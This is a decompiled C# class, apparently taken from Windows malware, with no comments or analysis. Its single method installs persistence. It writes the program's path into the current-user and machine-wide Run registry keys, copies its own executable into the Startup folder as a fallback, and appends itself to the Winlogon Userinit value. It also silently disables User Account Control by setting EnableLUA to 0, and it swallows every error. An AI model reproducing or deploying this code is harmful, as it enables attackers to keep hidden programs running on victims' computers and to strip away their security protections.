using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public sealed class GClass2
{
	[DebuggerNonUserCode]
	public GClass2()
	{
	}

	public static void smethod_0(string string_0, string string_1)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\system\\" + string_0;
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_0;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue(string_1) == null)
			{
				registryKey.SetValue(string_1, text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue(string_1), text, false) != 0)
			{
				registryKey.DeleteValue(string_1);
				registryKey.SetValue(string_1, text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (!File.Exists(text2))
			{
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue(string_1) == null)
			{
				registryKey.SetValue(string_1, text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue(string_1), text, false) != 0)
			{
				registryKey.DeleteValue(string_1);
				registryKey.SetValue(string_1, text);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			string text3 = registryKey.GetValue("Userinit")!.ToString();
			if (!text3.Contains(text))
			{
				registryKey.SetValue("Userinit", text3 + text + ",");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text4 = registryKey.GetValue("EnableLUA")!.ToString();
			if (Operators.CompareString(text4, "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}
}
